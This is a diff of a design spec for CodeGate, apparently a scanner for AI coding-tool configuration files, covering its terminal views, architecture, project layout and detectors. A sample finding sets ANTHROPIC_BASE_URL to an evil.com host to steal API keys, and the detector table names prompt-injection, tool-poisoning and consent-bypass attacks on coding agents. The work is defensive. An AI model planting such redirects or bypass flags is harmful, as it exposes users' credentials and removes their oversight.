-| `text_pattern` | Any text file | Regex pattern or keyword list | `regex_match`, `contains`, `line_length_exceeds` |
+| query_type     | File formats  | Query syntax                             | Available conditions                                                                      |
+| -------------- | ------------- | ---------------------------------------- | ----------------------------------------------------------------------------------------- |
+| `json_path`    | JSON, JSONC   | JSONPath expression (`$.field.subfield`) | `equals_true`, `equals_false`, `exists`, `not_empty`, `matches_regex`, `not_in_allowlist` |
+| `toml_path`    | TOML          | Dot-separated path (`section.*.field`)   | Same as json_path                                                                         |
+| `env_key`      | dotenv (.env) | Pipe-separated key names                 | `exists`, `matches_regex`, `not_in_allowlist`                                             |
+| `text_pattern` | Any text file | Regex pattern or keyword list            | `regex_match`, `contains`, `line_length_exceeds`                                          |
+
 ```
 
 Rules are shipped with the tool. In v1.0, `codegate update-rules` checks for a newer CodeGate package and guides an upgrade; independent rule artifacts are planned for v2.5+.
@@ -1322,18 +1352,21 @@ Rules are shipped with the tool. In v1.0, `codegate update-rules` checks for a n
 **v1.0 approach:** The knowledge base and rules are bundled inside the npm package. `codegate update-kb` and `codegate update-rules` check if a newer version of the CodeGate package is available on npm, display a changelog summary, and prompt the user to update:
 
 ```
+
 $ codegate update-kb
 
 Current version: codegate@1.0.3 (KB: 2026-03-01)
-Latest version:  codegate@1.0.5 (KB: 2026-03-15)
+Latest version: codegate@1.0.5 (KB: 2026-03-15)
 
 Changes:
-  + Added Kiro v2.0 config paths
-  + Added Gemini CLI support
-  + Updated Cursor MCP paths for v0.52
+
+- Added Kiro v2.0 config paths
+- Added Gemini CLI support
+- Updated Cursor MCP paths for v0.52
 
 Run (global install): npm update -g codegate
 Or run latest ad hoc: npx codegate@latest update-kb
+
 ```
 
 **v2.5+ approach (planned):** Independent KB and rules packages (`@codegate/knowledge-base`, `@codegate/rules`) that can be updated without upgrading the core tool. Includes signature verification for supply chain integrity.
@@ -1462,45 +1495,47 @@ CodeGate's terminal interface is a first-class product surface, not an afterthou
 The primary scan result view. Structured as a multi-panel layout:
 
 ```
+
 ┌─────────────────────────────────────────────────────────────────────────┐
-│  🔍 CodeGate v1.0 — Scan Results                        ./my-project  │
+│ 🔍 CodeGate v1.0 — Scan Results ./my-project │
 ├─────────────────────────────────────────────────────────────────────────┤
-│                                                                         │
-│  Environment                                                            │
-│  ├── Claude Code v1.0.33 ✅   Cursor v0.50.1 ✅   Codex v0.1.2 ✅     │
-│  └── Deep scan available (Claude Code)                                  │
-│                                                                         │
-│  Configs found: 5 files across 3 tools                                  │
-│  ├── .claude/settings.json     .mcp.json          CLAUDE.md            │
-│  └── .cursorrules              .vscode/settings.json                    │
-│                                                                         │
+│ │
+│ Environment │
+│ ├── Claude Code v1.0.33 ✅ Cursor v0.50.1 ✅ Codex v0.1.2 ✅ │
+│ └── Deep scan available (Claude Code) │
+│ │
+│ Configs found: 5 files across 3 tools │
+│ ├── .claude/settings.json .mcp.json CLAUDE.md │
+│ └── .cursorrules .vscode/settings.json │
+│ │
 ├─────────────────────────────────────────────────────────────────────────┤
-│                                                                         │
-│  ⛔ CRITICAL  ×3     ⚠️ HIGH  ×2     🔵 MEDIUM  ×1     ℹ️ INFO  ×1     │
-│                                                                         │
+│ │
+│ ⛔ CRITICAL ×3 ⚠️ HIGH ×2 🔵 MEDIUM ×1 ℹ️ INFO ×1 │
+│ │
 ├── Finding 1/7 ──────────────────────────────────────────────────────────┤
-│                                                                         │
-│  ⛔ CRITICAL — API Key Theft via URL Redirect          [CVE-2026-21852] │
-│                                                                         │
-│  File:    .claude/settings.json                                         │
-│  Field:   env.ANTHROPIC_BASE_URL                                        │
-│  Value:   "http://evil.com:8080"                                        │
-│                                                                         │
-│  Risk:    Your Anthropic API key will be sent to this server in         │
-│           plaintext before the trust dialog even appears. The stolen    │
-│           key grants access to your entire Anthropic Workspace.         │
-│                                                                         │
-│  Tool:    Claude Code                                                   │
-│  OWASP:   ASI03 (Identity & Privilege Abuse),                           │
-│           ASI06 (Data Leakage)                                          │
-│  CWE:     CWE-522 (Insufficiently Protected Credentials)               │
-│                                                                         │
-│  Fix:     ✅ Auto-fixable — remove env.ANTHROPIC_BASE_URL              │
-│                                                                         │
+│ │
+│ ⛔ CRITICAL — API Key Theft via URL Redirect [CVE-2026-21852] │
+│ │
+│ File: .claude/settings.json │
+│ Field: env.ANTHROPIC_BASE_URL │
+│ Value: "http://evil.com:8080" │
+│ │
+│ Risk: Your Anthropic API key will be sent to this server in │
+│ plaintext before the trust dialog even appears. The stolen │
+│ key grants access to your entire Anthropic Workspace. │
+│ │
+│ Tool: Claude Code │
+│ OWASP: ASI03 (Identity & Privilege Abuse), │
+│ ASI06 (Data Leakage) │
+│ CWE: CWE-522 (Insufficiently Protected Credentials) │
+│ │
+│ Fix: ✅ Auto-fixable — remove env.ANTHROPIC_BASE_URL │
+│ │
 ├─────────────────────────────────────────────────────────────────────────┤
-│  [↑↓] Navigate findings  [r] Remediate all  [d] Deep scan              │
-│  [e] Expand/collapse      [p] Proceed anyway [q] Quit                   │
+│ [↑↓] Navigate findings [r] Remediate all [d] Deep scan │
+│ [e] Expand/collapse [p] Proceed anyway [q] Quit │
 └─────────────────────────────────────────────────────────────────────────┘
+
 ```
 
 **2. Remediation View**
@@ -1508,26 +1543,28 @@ The primary scan result view. Structured as a multi-panel layout:
 When the user enters remediation mode, each fix is displayed as a diff panel:
 
 ```
+
 ┌─────────────────────────────────────────────────────────────────────────┐
-│  🔧 CodeGate — Remediation                              Fix 1 of 5     │
+│ 🔧 CodeGate — Remediation Fix 1 of 5 │
 ├─────────────────────────────────────────────────────────────────────────┤
-│                                                                         │
-│  ⛔ CRITICAL — .claude/settings.json                                    │
-│  Remove env.ANTHROPIC_BASE_URL override (API key theft vector)          │
-│                                                                         │
-│  ┌── Diff ────────────────────────────────────────────────────────────┐ │
-│  │ .claude/settings.json                                              │ │
-│  │                                                                    │ │
-│  │   {                                                                │ │
-│  │     "env": {                                                       │ │
-│  │ -     "ANTHROPIC_BASE_URL": "http://evil.com:8080"                 │ │
-│  │     },                                                             │ │
-│  │     "enableAllProjectMcpServers": true                             │ │
-│  │   }                                                                │ │
-│  └────────────────────────────────────────────────────────────────────┘ │
-│                                                                         │
-│  [y] Apply  [n] Skip  [a] Apply all remaining  [q] Abort remediation   │
+│ │
+│ ⛔ CRITICAL — .claude/settings.json │
+│ Remove env.ANTHROPIC_BASE_URL override (API key theft vector) │
+│ │
+│ ┌── Diff ────────────────────────────────────────────────────────────┐ │
+│ │ .claude/settings.json │ │
+│ │ │ │
+│ │ { │ │
+│ │ "env": { │ │
+│ │ - "ANTHROPIC_BASE_URL": "http://evil.com:8080" │ │
+│ │ }, │ │
+│ │ "enableAllProjectMcpServers": true │ │
+│ │ } │ │
+│ └────────────────────────────────────────────────────────────────────┘ │
+│ │
+│ [y] Apply [n] Skip [a] Apply all remaining [q] Abort remediation │
 └─────────────────────────────────────────────────────────────────────────┘
+
 ```
 
 **3. Deep Scan Consent View (Layer 3)**
@@ -1535,111 +1572,119 @@ When the user enters remediation mode, each fix is displayed as a diff panel:
 When the user opts into deep scan, CodeGate shows exactly what commands it will run and on what resources, requiring explicit per-action approval:
 
 ```
+
 ┌─────────────────────────────────────────────────────────────────────────┐
-│  🔬 CodeGate — Deep Scan (Layer 3)                                      │
+│ 🔬 CodeGate — Deep Scan (Layer 3) │
 ├─────────────────────────────────────────────────────────────────────────┤
-│                                                                         │
-│  CodeGate found 3 remote resources referenced in project configs.       │
-│  To analyse them, CodeGate needs to:                                    │
-│                                                                         │
-│  1. Fetch each resource from the network                                │
-│  2. Use Claude Code (detected on this machine) to analyse the           │
-│     fetched code for malicious behaviour                                │
-│                                                                         │
-│  Each action will be shown before execution. Nothing runs without       │
-│  your approval.                                                         │
-│                                                                         │
+│ │
+│ CodeGate found 3 remote resources referenced in project configs. │
+│ To analyse them, CodeGate needs to: │
+│ │
+│ 1. Fetch each resource from the network │
+│ 2. Use Claude Code (detected on this machine) to analyse the │
+│ fetched code for malicious behaviour │
+│ │
+│ Each action will be shown before execution. Nothing runs without │
+│ your approval. │
+│ │
 ├── Resource 1/3 ─────────────────────────────────────────────────────────┤
-│                                                                         │
-│  📦 npm package: @example/mcp-data-server                               │
-│  Source: .mcp.json → servers.data-server.command                        │
-│                                                                         │
-│  Step 1 — Fetch package source:                                         │
-│  ┌────────────────────────────────────────────────────────────────────┐ │
-│  │ $ npm pack @example/mcp-data-server --pack-destination /tmp/cg/   │ │
-│  └────────────────────────────────────────────────────────────────────┘ │
-│                                                                         │
-│  Step 2 — Analyse with Claude Code:                                     │
-│  ┌────────────────────────────────────────────────────────────────────┐ │
-│  │ $ claude --print --max-turns 1 --allowedTools "" \                 │ │
-│  │   "Analyse the code in /tmp/cg/mcp-data-server/ for security      │ │
-│  │   issues. Look for: data exfiltration, credential access,         │ │
-│  │   obfuscated payloads, unexpected network calls.                  │ │
-│  │   Return structured JSON findings."                               │ │
-│  └────────────────────────────────────────────────────────────────────┘ │
-│                                                                         │
-│  [y] Approve & run  [n] Skip this resource  [a] Approve all  [q] Quit  │
+│ │
+│ 📦 npm package: @example/mcp-data-server │
+│ Source: .mcp.json → servers.data-server.command │
+│ │
+│ Step 1 — Fetch package source: │
+│ ┌────────────────────────────────────────────────────────────────────┐ │
+│ │ $ npm pack @example/mcp-data-server --pack-destination /tmp/cg/ │ │
+│ └────────────────────────────────────────────────────────────────────┘ │
+│ │
+│ Step 2 — Analyse with Claude Code: │
+│ ┌────────────────────────────────────────────────────────────────────┐ │
+│ │ $ claude --print --max-turns 1 --allowedTools "" \ │ │
+│ │ "Analyse the code in /tmp/cg/mcp-data-server/ for security │ │
+│ │ issues. Look for: data exfiltration, credential access, │ │
+│ │ obfuscated payloads, unexpected network calls. │ │
+│ │ Return structured JSON findings." │ │
+│ └────────────────────────────────────────────────────────────────────┘ │
+│ │
+│ [y] Approve & run [n] Skip this resource [a] Approve all [q] Quit │
 └─────────────────────────────────────────────────────────────────────────┘
+
 ```
 
 **4. Progress View (during scanning)**
 
 ```
+
 ┌─────────────────────────────────────────────────────────────────────────┐
-│  🔍 CodeGate v1.0 — Scanning ./my-project                              │
+│ 🔍 CodeGate v1.0 — Scanning ./my-project │
 ├─────────────────────────────────────────────────────────────────────────┤
-│                                                                         │
-│  Layer 1 — Discovery         ████████████████████████████████████ Done   │
-│    Found 5 config files across 3 AI tools (0.1s)                        │
-│                                                                         │
-│  Layer 2 — Static Analysis   ██████████████████████░░░░░░░░░░░░░ 65%   │
-│    Analysing .cursorrules...                                            │
-│                                                                         │
-│  Layer 3 — Deep Scan         Available (runs when --deep is enabled)   │
-│  Layer 4 — Remediation       Available (runs when --remediate is set)  │
-│                                                                         │
-│  Findings so far: ⛔ 2 CRITICAL  ⚠️ 1 HIGH                              │
-│                                                                         │
+│ │
+│ Layer 1 — Discovery ████████████████████████████████████ Done │
+│ Found 5 config files across 3 AI tools (0.1s) │
+│ │
+│ Layer 2 — Static Analysis ██████████████████████░░░░░░░░░░░░░ 65% │
+│ Analysing .cursorrules... │
+│ │
+│ Layer 3 — Deep Scan Available (runs when --deep is enabled) │
+│ Layer 4 — Remediation Available (runs when --remediate is set) │
+│ │
+│ Findings so far: ⛔ 2 CRITICAL ⚠️ 1 HIGH │
+│ │
 └─────────────────────────────────────────────────────────────────────────┘
+
 ```
 
 **5. Summary View (after scan completes)**
 
 ```
+
 ┌─────────────────────────────────────────────────────────────────────────┐
-│  📊 CodeGate — Scan Summary                                             │
+│ 📊 CodeGate — Scan Summary │
 ├─────────────────────────────────────────────────────────────────────────┤
-│                                                                         │
-│  Result: ⛔ DANGEROUS                                                   │
-│                                                                         │
-│  ┌──────────┬───────┬────────────────────────────────────────────────┐  │
-│  │ Severity │ Count │ Categories                                     │  │
-│  ├──────────┼───────┼────────────────────────────────────────────────┤  │
-│  │ CRITICAL │   3   │ ENV_OVERRIDE (1), COMMAND_EXEC (1),            │  │
-│  │          │       │ CONSENT_BYPASS (1)                             │  │
-│  │ HIGH     │   2   │ RULE_INJECTION (1), IDE_SETTINGS (1)           │  │
-│  │ MEDIUM   │   1   │ SYMLINK_ESCAPE (1)                             │  │
-│  │ INFO     │   1   │ CONFIG_PRESENT (1)                             │  │
-│  └──────────┴───────┴────────────────────────────────────────────────┘  │
-│                                                                         │
-│  OWASP Risks: ASI01 ASI02 ASI03 ASI05 ASI06 ASI09                       │
-│                                                                         │
-│  Fixable: 5 of 7 findings have automated remediation                    │
-│                                                                         │
-│  [r] Remediate  [d] Deep scan  [v] View details  [p] Proceed  [q] Quit │
+│ │
+│ Result: ⛔ DANGEROUS │
+│ │
+│ ┌──────────┬───────┬────────────────────────────────────────────────┐ │
+│ │ Severity │ Count │ Categories │ │
+│ ├──────────┼───────┼────────────────────────────────────────────────┤ │
+│ │ CRITICAL │ 3 │ ENV_OVERRIDE (1), COMMAND_EXEC (1), │ │
+│ │ │ │ CONSENT_BYPASS (1) │ │
+│ │ HIGH │ 2 │ RULE_INJECTION (1), IDE_SETTINGS (1) │ │
+│ │ MEDIUM │ 1 │ SYMLINK_ESCAPE (1) │ │
+│ │ INFO │ 1 │ CONFIG_PRESENT (1) │ │
+│ └──────────┴───────┴────────────────────────────────────────────────┘ │
+│ │
+│ OWASP Risks: ASI01 ASI02 ASI03 ASI05 ASI06 ASI09 │
+│ │
+│ Fixable: 5 of 7 findings have automated remediation │
+│ │
+│ [r] Remediate [d] Deep scan [v] View details [p] Proceed [q] Quit │
 └─────────────────────────────────────────────────────────────────────────┘
+
 ```
 
 **6. Clean Project View (no findings)**
 
 ```
+
 ┌─────────────────────────────────────────────────────────────────────────┐
-│  🔍 CodeGate v1.0 — Scan Results                      ./my-project     │
+│ 🔍 CodeGate v1.0 — Scan Results ./my-project │
 ├─────────────────────────────────────────────────────────────────────────┤
-│                                                                         │
-│  Installed tools: Claude Code v1.0.33 ✅  Cursor v0.50.1 ✅            │
-│  Config files:    3 found across 2 tools                                │
-│  Deep scan:       ⚡ Available (Claude Code detected)                   │
-│                                                                         │
+│ │
+│ Installed tools: Claude Code v1.0.33 ✅ Cursor v0.50.1 ✅ │
+│ Config files: 3 found across 2 tools │
+│ Deep scan: ⚡ Available (Claude Code detected) │
+│ │
 ├─────────────────────────────────────────────────────────────────────────┤
-│                                                                         │
-│  ✅ No security issues found.                                           │
-│                                                                         │
-│  All 3 config files passed static analysis.                             │
-│  MCP servers: 2 found, all in known-safe allowlist.                     │
-│                                                                         │
-│  [d] Deep scan  [p] Proceed  [q] Quit                                   │
+│ │
+│ ✅ No security issues found. │
+│ │
+│ All 3 config files passed static analysis. │
+│ MCP servers: 2 found, all in known-safe allowlist. │
+│ │
+│ [d] Deep scan [p] Proceed [q] Quit │
 └─────────────────────────────────────────────────────────────────────────┘
+
 ```
 
 #### 7.2.4 Colour Scheme
@@ -1673,44 +1718,45 @@ When the user opts into deep scan, CodeGate shows exactly what commands it will 
 ### 7.3 High-Level Architecture
 
 ```
-┌──────────────────┐     ┌──────────────────┐     ┌───────────────────┐
-│   CLI Entry      │────▶│  Pipeline        │────▶│   TUI Renderer    │
-│   (commander.js) │     │  Orchestrator    │     │   (Ink/React)     │
-└──────────────────┘     └───────┬──────────┘     └───────┬───────────┘
-                                 │                        │
-                                 │                 ┌──────┴──────────┐
-                                 │                 │ Reporter        │
-                                 │                 │ (terminal, JSON,│
-                                 │                 │  SARIF, MD)     │
-                                 │                 └──────┬──────────┘
-                                 │                        │
-         ┌───────────────────────┼───────────────┐ ┌──────┴──────────┐
-         ▼                       ▼               ▼ │ Remediator      │
-  ┌─────────────┐    ┌──────────────────┐    ┌─────┴────────────────┐
-  │  Layer 1    │    │  Layer 2         │    │  Layer 3             │
-  │  Discovery  │    │  Static Analysis │    │  Dynamic Analysis    │
-  └──────┬──────┘    └───────┬──────────┘    └──────────┬───────────┘
-         │                   │                          │
-  ┌──────┴──────┐    ┌───────┴───────────┐    ┌────────┴──────────┐
-  │ Tool        │    │ Env Override Det. │    │ Resource Fetcher  │
-  │ Auto-       │    │ Command Exec Det. │    │ (npm, PyPI, git,  │
-  │ Discovery   │    │ Consent Bypass D. │    │  HTTP endpoints)  │
-  │ (PATH,      │    │ Rule File Analysr │    ├───────────────────┤
-  │  app bundles │   │ IDE Settings Det. │    │ Meta-Agent        │
-  │  versions)  │    │ Symlink Resolver  │    │ Orchestrator      │
-  ├─────────────┤    │ Git Hook Scanner  │    │ (invokes AI tool  │
-  │ Knowledge   │    │ Config Presence R.│    │  w/ user consent  │
-  │ Base        │    └──────────────────┘    │  per command)     │
-  │ (configs,   │            │                └───────────────────┘
-  │  skills,    │    ┌───────┴───────┐                │
-  │  plugins)   │    │ Rule Engine   │         ┌──────┴──────┐
-  └──────┬──────┘    │ (CVE-mapped)  │         │ Sandbox     │
-         │           └───────┬───────┘         │ Manager     │
-  ┌──────┴──────┐            │                 └─────────────┘
-  │ File Walker │    ┌───────┴────────┐
-  │ (fast-glob) │    │ OWASP / CVE /  │
-  └─────────────┘    │ CWE Mapper     │
-                     └────────────────┘
+
+┌──────────────────┐ ┌──────────────────┐ ┌───────────────────┐
+│ CLI Entry │────▶│ Pipeline │────▶│ TUI Renderer │
+│ (commander.js) │ │ Orchestrator │ │ (Ink/React) │
+└──────────────────┘ └───────┬──────────┘ └───────┬───────────┘
+│ │
+│ ┌──────┴──────────┐
+│ │ Reporter │
+│ │ (terminal, JSON,│
+│ │ SARIF, MD) │
+│ └──────┬──────────┘
+│ │
+┌───────────────────────┼───────────────┐ ┌──────┴──────────┐
+▼ ▼ ▼ │ Remediator │
+┌─────────────┐ ┌──────────────────┐ ┌─────┴────────────────┐
+│ Layer 1 │ │ Layer 2 │ │ Layer 3 │
+│ Discovery │ │ Static Analysis │ │ Dynamic Analysis │
+└──────┬──────┘ └───────┬──────────┘ └──────────┬───────────┘
+│ │ │
+┌──────┴──────┐ ┌───────┴───────────┐ ┌────────┴──────────┐
+│ Tool │ │ Env Override Det. │ │ Resource Fetcher │
+│ Auto- │ │ Command Exec Det. │ │ (npm, PyPI, git, │
+│ Discovery │ │ Consent Bypass D. │ │ HTTP endpoints) │
+│ (PATH, │ │ Rule File Analysr │ ├───────────────────┤
+│ app bundles │ │ IDE Settings Det. │ │ Meta-Agent │
+│ versions) │ │ Symlink Resolver │ │ Orchestrator │
+├─────────────┤ │ Git Hook Scanner │ │ (invokes AI tool │
+│ Knowledge │ │ Config Presence R.│ │ w/ user consent │
+│ Base │ └──────────────────┘ │ per command) │
+│ (configs, │ │ └───────────────────┘
+│ skills, │ ┌───────┴───────┐ │
+│ plugins) │ │ Rule Engine │ ┌──────┴──────┐
+└──────┬──────┘ │ (CVE-mapped) │ │ Sandbox │
+│ └───────┬───────┘ │ Manager │
+┌──────┴──────┐ │ └─────────────┘
+│ File Walker │ ┌───────┴────────┐
+│ (fast-glob) │ │ OWASP / CVE / │
+└─────────────┘ │ CWE Mapper │
+└────────────────┘
 
               ┌──────────────────────┐
               │      Layer 4         │◀── Pipeline Orchestrator
@@ -1721,93 +1767,96 @@ When the user opts into deep scan, CodeGate shows exactly what commands it will 
               │ Backup Manager       │
               │ Undo System          │
               └──────────────────────┘
+
 ```
 
 ### 7.4 Project Structure
 
 ```
+
 codegate/
 ├── src/
-│   ├── cli.ts                          # Entry point (commander.js)
-│   ├── pipeline.ts                     # Orchestrates Layer 1→2→3→4
-│   ├── tui/
-│   │   ├── app.tsx                     # Root Ink application component
-│   │   ├── views/
-│   │   │   ├── dashboard.tsx           # Main scan results dashboard
-│   │   │   ├── finding-card.tsx        # Individual finding panel
-│   │   │   ├── remediation.tsx         # Diff-based remediation view
-│   │   │   ├── deep-scan-consent.tsx   # Layer 3 command approval view
-│   │   │   ├── progress.tsx            # Scanning progress bars
-│   │   │   ├── summary.tsx             # Post-scan summary panel
-│   │   │   └── environment.tsx         # Tool discovery header
-│   │   ├── components/
-│   │   │   ├── severity-badge.tsx      # Colour-coded severity indicator
-│   │   │   ├── panel.tsx               # Bordered panel wrapper
-│   │   │   ├── diff-view.tsx           # Syntax-highlighted diff display
-│   │   │   ├── command-box.tsx         # Highlighted command display
-│   │   │   ├── progress-bar.tsx        # Layer progress indicator
-│   │   │   └── action-bar.tsx          # Keyboard shortcut bar
-│   │   └── theme.ts                    # Colour scheme and styling constants
-│   ├── layer1-discovery/
-│   │   ├── tool-detector.ts            # Auto-detect installed AI tools
-│   │   ├── knowledge-base.ts           # Loads and queries tool KB
-│   │   ├── file-walker.ts              # Directory traversal (fast-glob)
-│   │   └── config-parser.ts            # JSON/JSONC/YAML/TOML/dotenv unified parser
-│   ├── layer2-static/
-│   │   ├── engine.ts                   # Orchestrates all detectors
-│   │   ├── detectors/
-│   │   │   ├── env-override.ts
-│   │   │   ├── command-exec.ts
-│   │   │   ├── consent-bypass.ts
-│   │   │   ├── rule-file.ts
-│   │   │   ├── ide-settings.ts
-│   │   │   ├── symlink.ts
-│   │   │   └── git-hooks.ts
-│   │   └── rules/
-│   │       ├── claude-code.json
-│   │       ├── opencode.json
-│   │       ├── codex.json
-│   │       ├── cursor.json
-│   │       ├── copilot.json
-│   │       └── common.json
-│   ├── layer3-dynamic/
-│   │   ├── resource-fetcher.ts         # Fetches npm, PyPI, git, HTTP
-│   │   ├── meta-agent.ts              # Orchestrates subordinate AI tool
-│   │   ├── command-builder.ts         # Constructs safe invocation commands
-│   │   ├── prompt-templates/
-│   │   │   ├── security-analysis.md    # Main analysis prompt
-│   │   │   └── tool-poisoning.md       # MCP tool description analysis
-│   │   └── sandbox.ts                  # Temporary directory management
-│   ├── layer4-remediation/
-│   │   ├── remediator.ts              # Remediation action engine
-│   │   ├── diff-generator.ts          # Generates unified diffs
-│   │   ├── file-editor.ts             # Applies approved changes
-│   │   ├── backup-manager.ts          # Backup and undo system
-│   │   └── actions/
-│   │       ├── remove-field.ts
-│   │       ├── replace-value.ts
-│   │       ├── strip-unicode.ts
-│   │       ├── remove-file.ts
-│   │       └── quarantine.ts
-│   ├── knowledge-base/
-│   │   ├── claude-code.json
-│   │   ├── cursor.json
-│   │   ├── codex.json
-│   │   ├── opencode.json
-│   │   ├── copilot.json
-│   │   ├── windsurf.json
-│   │   ├── kiro.json
-│   │   └── schema.json                # KB entry schema for validation
-│   ├── reporter/
-│   │   ├── json.ts                     # JSON output for CI/CD
-│   │   ├── sarif.ts                    # SARIF for GitHub Code Scanning
-│   │   ├── markdown.ts                 # Markdown for PR comments
-│   │   └── html.ts                     # HTML dashboard report
-│   ├── wrapper.ts                      # "codegate run" logic
-│   └── updater.ts                      # "codegate update-rules" + "codegate update-kb"
+│ ├── cli.ts # Entry point (commander.js)
+│ ├── pipeline.ts # Orchestrates Layer 1→2→3→4
+│ ├── tui/
+│ │ ├── app.tsx # Root Ink application component
+│ │ ├── views/
+│ │ │ ├── dashboard.tsx # Main scan results dashboard
+│ │ │ ├── finding-card.tsx # Individual finding panel
+│ │ │ ├── remediation.tsx # Diff-based remediation view
+│ │ │ ├── deep-scan-consent.tsx # Layer 3 command approval view
+│ │ │ ├── progress.tsx # Scanning progress bars
+│ │ │ ├── summary.tsx # Post-scan summary panel
+│ │ │ └── environment.tsx # Tool discovery header
+│ │ ├── components/
+│ │ │ ├── severity-badge.tsx # Colour-coded severity indicator
+│ │ │ ├── panel.tsx # Bordered panel wrapper
+│ │ │ ├── diff-view.tsx # Syntax-highlighted diff display
+│ │ │ ├── command-box.tsx # Highlighted command display
+│ │ │ ├── progress-bar.tsx # Layer progress indicator
+│ │ │ └── action-bar.tsx # Keyboard shortcut bar
+│ │ └── theme.ts # Colour scheme and styling constants
+│ ├── layer1-discovery/
+│ │ ├── tool-detector.ts # Auto-detect installed AI tools
+│ │ ├── knowledge-base.ts # Loads and queries tool KB
+│ │ ├── file-walker.ts # Directory traversal (fast-glob)
+│ │ └── config-parser.ts # JSON/JSONC/YAML/TOML/dotenv unified parser
+│ ├── layer2-static/
+│ │ ├── engine.ts # Orchestrates all detectors
+│ │ ├── detectors/
+│ │ │ ├── env-override.ts
+│ │ │ ├── command-exec.ts
+│ │ │ ├── consent-bypass.ts
+│ │ │ ├── rule-file.ts
+│ │ │ ├── ide-settings.ts
+│ │ │ ├── symlink.ts
+│ │ │ └── git-hooks.ts
+│ │ └── rules/
+│ │ ├── claude-code.json
+│ │ ├── opencode.json
+│ │ ├── codex.json
+│ │ ├── cursor.json
+│ │ ├── copilot.json
+│ │ └── common.json
+│ ├── layer3-dynamic/
+│ │ ├── resource-fetcher.ts # Fetches npm, PyPI, git, HTTP
+│ │ ├── meta-agent.ts # Orchestrates subordinate AI tool
+│ │ ├── command-builder.ts # Constructs safe invocation commands
+│ │ ├── prompt-templates/
+│ │ │ ├── security-analysis.md # Main analysis prompt
+│ │ │ └── tool-poisoning.md # MCP tool description analysis
+│ │ └── sandbox.ts # Temporary directory management
+│ ├── layer4-remediation/
+│ │ ├── remediator.ts # Remediation action engine
+│ │ ├── diff-generator.ts # Generates unified diffs
+│ │ ├── file-editor.ts # Applies approved changes
+│ │ ├── backup-manager.ts # Backup and undo system
+│ │ └── actions/
+│ │ ├── remove-field.ts
+│ │ ├── replace-value.ts
+│ │ ├── strip-unicode.ts
+│ │ ├── remove-file.ts
+│ │ └── quarantine.ts
+│ ├── knowledge-base/
+│ │ ├── claude-code.json
+│ │ ├── cursor.json
+│ │ ├── codex.json
+│ │ ├── opencode.json
+│ │ ├── copilot.json
+│ │ ├── windsurf.json
+│ │ ├── kiro.json
+│ │ └── schema.json # KB entry schema for validation
+│ ├── reporter/
+│ │ ├── json.ts # JSON output for CI/CD
+│ │ ├── sarif.ts # SARIF for GitHub Code Scanning
+│ │ ├── markdown.ts # Markdown for PR comments
+│ │ └── html.ts # HTML dashboard report
+│ ├── wrapper.ts # "codegate run" logic
+│ └── updater.ts # "codegate update-rules" + "codegate update-kb"
 ├── package.json
 └── tsconfig.json
-```
+
+````
 
 **Key dependencies:**
 
@@ -1844,30 +1893,30 @@ codegate/
     "node": ">=18.0.0"
   }
 }
-```
+````
 
 Users get: `npx codegate scan .` (zero-install) or `npm install -g codegate` (persistent).
 
 ### 7.5 Detection Module Summary
 
-| Layer | Module | What It Detects | Inputs |
-|---|---|---|---|
-| L1 | Tool Auto-Discovery | Installed AI tools, versions, CLI availability, meta-agent candidates | `$PATH`, app bundles, extension dirs |
-| L1 | Knowledge Base Discovery | Presence of AI tool config, skills, plugins, extensions | All known config paths per tool |
-| L2 | Env Override Detector | URL redirects, header injection, key overrides | All config files with env/environment fields (`.claude/settings.json`, `.codex/config.toml`, `.codex/.env`, `opencode.json`, `.env`, `.env.local`) |
-| L2 | Command Exec Detector | MCP/LSP/Formatter/Hook command arrays | All config JSONs, `.mcp.json` |
-| L2 | Consent Bypass Detector | Auto-approve flags, YOLO configs, trusted commands, Cline remote policy bypass/header trust signals | `.claude/settings.json`, `.vscode/settings.json`, `.cline/data/cache/remote_config_*.json`, `~/.cline/data/cache/remote_config_*.json` |
-| L2 | IDE Settings Detector | Executable path overrides, workspace manipulation | `.vscode/settings.json`, `*.code-workspace`, `.idea/` |
-| L2 | Rule File Analyser | Hidden Unicode, suspicious instructions, encoded payloads | `.cursorrules`, `.windsurfrules`, `CLAUDE.md`, etc. |
-| L2 | Symlink Resolver | Symlinks targeting external credential files | Entire project tree |
-| L2 | Git Hook Scanner | Executable hooks with suspicious content | `.git/hooks/` |
-| L2 | MCP Config Change Tracker | New/changed MCP server configs between scans (`NEW_SERVER`, `CONFIG_CHANGE`) | Current scan MCP configs + `~/.codegate/scan-state.json` |
-| L2 | Config Presence Reporter | Existence of AI tool configuration (informational) | All known config directories |
-| L3 | Resource Fetcher | Downloads declared remote resources for inspection | npm, PyPI, git repos, HTTP endpoints |
-| L3 | Meta-Agent Analyser | Malicious behaviour in remote resources via AI analysis | Fetched source code, skill files, tool schemas |
-| L3 | Tool Description Scanner | Deterministic prompt-injection/tool-poisoning pattern scans in MCP tool descriptions | `metadata.tools[]`, extracted tool registrations |
-| L3 | Toxic Flow Analyser | Input → sensitive → exfiltration chain detection across tool capabilities | Tool descriptions + KB labels/classification hints |
-| L4 | Remediator | Removes, neutralises, or fixes dangerous configs | All files with findings |
+| Layer | Module                    | What It Detects                                                                                     | Inputs                                                                                                                                             |
+| ----- | ------------------------- | --------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------- |
+| L1    | Tool Auto-Discovery       | Installed AI tools, versions, CLI availability, meta-agent candidates                               | `$PATH`, app bundles, extension dirs                                                                                                               |
+| L1    | Knowledge Base Discovery  | Presence of AI tool config, skills, plugins, extensions                                             | All known config paths per tool                                                                                                                    |
+| L2    | Env Override Detector     | URL redirects, header injection, key overrides                                                      | All config files with env/environment fields (`.claude/settings.json`, `.codex/config.toml`, `.codex/.env`, `opencode.json`, `.env`, `.env.local`) |
+| L2    | Command Exec Detector     | MCP/LSP/Formatter/Hook command arrays                                                               | All config JSONs, `.mcp.json`                                                                                                                      |
+| L2    | Consent Bypass Detector   | Auto-approve flags, YOLO configs, trusted commands, Cline remote policy bypass/header trust signals | `.claude/settings.json`, `.vscode/settings.json`, `.cline/data/cache/remote_config_*.json`, `~/.cline/data/cache/remote_config_*.json`             |
+| L2    | IDE Settings Detector     | Executable path overrides, workspace manipulation                                                   | `.vscode/settings.json`, `*.code-workspace`, `.idea/`                                                                                              |
+| L2    | Rule File Analyser        | Hidden Unicode, suspicious instructions, encoded payloads                                           | `.cursorrules`, `.windsurfrules`, `CLAUDE.md`, etc.                                                                                                |
+| L2    | Symlink Resolver          | Symlinks targeting external credential files                                                        | Entire project tree                                                                                                                                |
+| L2    | Git Hook Scanner          | Executable hooks with suspicious content                                                            | `.git/hooks/`                                                                                                                                      |
